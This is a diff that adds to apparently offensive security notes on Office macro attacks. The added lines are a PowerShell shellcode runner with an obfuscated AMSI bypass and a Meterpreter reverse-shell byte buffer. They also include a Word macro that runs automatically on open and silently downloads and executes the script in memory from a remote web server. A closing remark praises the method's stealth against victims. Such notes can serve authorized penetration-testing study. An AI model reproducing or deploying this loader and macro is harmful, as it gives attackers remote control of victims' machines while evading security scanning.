@@ -42,6 +42,79 @@ host the file on the Team Server so we can simply send a link for them to downlo
 
 Run the macro on the victim's machine to get a beacon.
 
+### PowerShell  Reflection Shellcode Runner (Best)
+
+Create run.ps1 powershell script that will be hosted on your web server:
+
+```
+# Compact AMSI bypass
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Shellcode loader >:]
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+    @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+    Param (
+    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+    [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).
+    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
+    [System.MulticastDelegate])
+    $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public',
+    [System.Reflection.CallingConventions]::Standard, $func).
+    SetImplementationFlags('Runtime, Managed')
+    $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+    SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+# Allocate executable memory
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
+  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+# Copy shellcode to allocated memory
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.67 LPORT=443 EXITFUNC=thread -f powershell
+[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+# Execute shellcode and wait for it to exit
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
+  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
+  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+
+Now create a VB macro that includes a cradle that will download the ps1 script and run it in memory:
+```
+Sub MyMacro()
+ Dim str As String
+ str = "powershell (New-Object 
+System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
+ Shell str, vbHide
+End Sub
+Sub Document_Open()
+ MyMacro
+End Sub
+Sub AutoOpen()
+ MyMacro
+End Sub
+```
+
 ### Powershell staged payload
 
 This macro will pull a Meterpreter executable from our webserver. Make sure to update the download file string.
@@ -126,6 +199,7 @@ Sub AutoOpen()
  MyMacro
 End Sub
 ```
+This approach is rather low-profile. Our shellcode resides in memory and there is no malicious executable on the victim’s machine. However, the primary disadvantage is that when the victim closes Word, our shell will die.
 
 ## Powershell one linear
 
